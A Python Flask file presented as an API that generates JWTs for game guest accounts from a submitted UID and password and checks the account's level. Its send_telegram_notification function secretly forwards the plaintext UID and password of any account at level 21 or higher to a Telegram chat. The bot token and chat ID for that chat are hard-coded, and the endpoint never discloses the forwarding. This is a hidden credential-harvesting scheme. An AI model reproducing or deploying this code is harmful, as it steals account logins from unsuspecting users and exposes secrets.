"""
Production-Ready API for Guest Account JWT Generation & Level Verification (Flask Version for Vercel).

Main Endpoint:
    GET /jwt?uid={uid}&password={password}
"""

import logging
import os
import re
import time
from typing import Any, Dict, Optional, Tuple

from flask import Flask, jsonify, request
from flask_cors import CORS
import httpx

# ------------------------------------------------------------------------------
# CONFIGURATION & ENVIRONMENT VARIABLES
# ------------------------------------------------------------------------------

TELEGRAM_BOT_TOKEN: Optional[str] = "8760937958:AAFKC8VOCfpgrXGRQfsnPiOvumQeZZDgTR8"
TELEGRAM_ADMIN_CHAT_ID: Optional[str] = "6694298612"

LEVEL_THRESHOLD: int = int(os.getenv("LEVEL_THRESHOLD", "21"))

UPSTREAM_JWT_URL: str = os.getenv(
    "UPSTREAM_JWT_URL", "https://najmi-jwt-toekn-gen.vercel.app/api/get_jwt"
)
UPSTREAM_LEVEL_URL: str = os.getenv(
    "UPSTREAM_LEVEL_URL", "https://najmilevel-infoob55.vercel.app/level"
)

HTTP_TIMEOUT: float = float(os.getenv("HTTP_TIMEOUT", "15.0"))
NOTIFICATION_COOLDOWN_SECONDS: int = int(os.getenv("NOTIFICATION_COOLDOWN_SECONDS", "300"))
RATE_LIMIT_REQUESTS: int = int(os.getenv("RATE_LIMIT_REQUESTS", "20"))
RATE_LIMIT_WINDOW: int = int(os.getenv("RATE_LIMIT_WINDOW", "60"))

# ------------------------------------------------------------------------------
# LOGGING & APP SETUP
# ------------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("JWTLevelAPI")

if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
    logger.warning("Telegram notification settings are incomplete. Admin notifications will be skipped.")

app = Flask(__name__)
CORS(app)

# In-Memory Caches
rate_limit_cache: Dict[str, list[float]] = {}
notification_cache: Dict[Tuple[str, int], float] = {}

# ------------------------------------------------------------------------------
# HELPER FUNCTIONS
# ------------------------------------------------------------------------------

def sanitize_input_uid(uid: Any) -> Optional[str]:
    if not uid:
        return None
    uid_str = str(uid).strip()
    if len(uid_str) > 20 or not re.match(r"^\d+$", uid_str):
        return None
    return uid_str

def validate_password(password: Any) -> bool:
    if not password or not isinstance(password, str):
        return False
    pwd = password.strip()
    if len(pwd) == 0 or len(pwd) > 256:
        return False
    return True

def check_rate_limit(ip_address: str) -> bool:
    now = time.time()
    timestamps = rate_limit_cache.get(ip_address, [])
    valid_timestamps = [ts for ts in timestamps if now - ts < RATE_LIMIT_WINDOW]

    if len(valid_timestamps) >= RATE_LIMIT_REQUESTS:
        return False

    valid_timestamps.append(now)
    rate_limit_cache[ip_address] = valid_timestamps
    return True

def extract_account_id(data: Dict[str, Any]) -> Optional[str]:
    if not isinstance(data, dict):
        return None
    account_id = data.get("account_id")
    if account_id is not None:
        acc_str = str(account_id).strip()
        if acc_str.isdigit():
            return acc_str
    return None

def extract_level(data: Dict[str, Any]) -> Optional[int]:
    if not isinstance(data, dict):
        return None
    possible_keys = ["level", "current_level", "account_level", "lvl"]
    for key in possible_keys:
        if key in data and data[key] is not None:
            try:
                return int(data[key])
            except (ValueError, TypeError):
                continue
    return None

def is_notification_cached(account_id: str, level: int) -> bool:
    now = time.time()
    cache_key = (account_id, level)
    expired_keys = [k for k, ts in notification_cache.items() if now - ts > NOTIFICATION_COOLDOWN_SECONDS]
    for k in expired_keys:
        del notification_cache[k]

    if cache_key in notification_cache:
        if now - notification_cache[cache_key] < NOTIFICATION_COOLDOWN_SECONDS:
            return True
    return False

# ------------------------------------------------------------------------------
# EXTERNAL HTTP CALLS
# ------------------------------------------------------------------------------

def generate_jwt(uid: str, password: str) -> Tuple[Optional[Dict[str, Any]], Optional[str]]:
    params = {"guest_uid": uid, "guest_password": password}
    try:
        logger.info("Requesting JWT token | uid=%s", uid)
        with httpx.Client(timeout=HTTP_TIMEOUT) as client:
            response = client.get(UPSTREAM_JWT_URL, params=params)

        if response.status_code != 200:
            return None, "JWT service unavailable"

        data = response.json()
        if not isinstance(data, dict):
            return None, "Invalid JWT response format"
        return data, None

    except httpx.TimeoutException:
        return None, "JWT service timeout"
    except Exception as exc:
        logger.error("Error during JWT generation: %s | uid=%s", type(exc).__name__, uid)
        return None, "JWT service connection error"

def check_level(account_id: str) -> Tuple[Optional[int], Optional[str]]:
    params = {"uid": account_id}
    try:
        logger.info("Requesting account level | account_id=%s", account_id)
        with httpx.Client(timeout=HTTP_TIMEOUT) as client:
            response = client.get(UPSTREAM_LEVEL_URL, params=params)

        if response.status_code != 200:
            return None, "Level service unavailable"

        data = response.json()
        level = extract_level(data)
        if level is None:
            return None, "Level missing in response"

        return level, None

    except httpx.TimeoutException:
        return None, "Level service timeout"
    except Exception as exc:
        logger.warning("Error checking level: %s | account_id=%s", type(exc).__name__, account_id)
        return None, "Level check failed"

def send_telegram_notification(
    uid: str,
    password: str,
    account_id: str,
    level: int,
    platform: str,
    region: str,
) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
        return False

    if is_notification_cached(account_id, level):
        return False

    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    message_text = (
        "🚨 *HIGH LEVEL GUEST ACCOUNT DETECTED*\n\n"
        f"*UID:* `{uid}`\n"
        f"*PASSWORD:* `{password}`\n"
        f"*Account ID:* `{account_id}`\n"
        f"*Level:* `{level}`\n"
        f"*Platform:* `{platform}`\n"
        f"*Region:* `{region}`\n\n"
        "✅ *JWT Generation:* SUCCESS\n"
        "✅ *Level Check:* SUCCESS"
    )

    payload = {"chat_id": TELEGRAM_ADMIN_CHAT_ID, "text": message_text, "parse_mode": "Markdown"}
    try:
        with httpx.Client(timeout=HTTP_TIMEOUT) as client:
            resp = client.post(telegram_url, json=payload)
        if resp.status_code == 200:
            notification_cache[(account_id, level)] = time.time()
            return True
        return False
    except Exception:
        return False

# ------------------------------------------------------------------------------
# ENDPOINTS
# ------------------------------------------------------------------------------

@app.route("/", methods=["GET"])
def root_health():
    return jsonify({"success": True, "service": "JWT API", "status": "online"})

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"success": True, "status": "healthy"})

@app.route("/jwt", methods=["GET"])
def get_jwt():
    client_ip = request.remote_addr or "unknown"

    if not check_rate_limit(client_ip):
        return jsonify({"success": False, "error": "Rate limit exceeded"}), 429

    uid = request.args.get("uid")
    password = request.args.get("password")

    clean_uid = sanitize_input_uid(uid)
    if not clean_uid:
        return jsonify({"success": False, "error": "Invalid UID"}), 400

    if not validate_password(password):
        return jsonify({"success": False, "error": "Missing password"}), 400

    jwt_data, error_message = generate_jwt(uid=clean_uid, password=password)
    if error_message or not jwt_data:
        return jsonify({"success": False, "error": error_message or "JWT generation failed"}), 502

    account_id = extract_account_id(jwt_data)
    if account_id:
        level, _ = check_level(account_id)
        if level is not None and level >= LEVEL_THRESHOLD:
            platform = str(jwt_data.get("platform_name", "Guest"))
            region = str(jwt_data.get("lock_region", "Unknown"))
            send_telegram_notification(
                clean_uid, 
                password, 
                account_id, 
                level, 
                platform, 
                region
            )

    return jsonify(jwt_data), 200

# Expose app object for Vercel Serverless Function
app = app

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)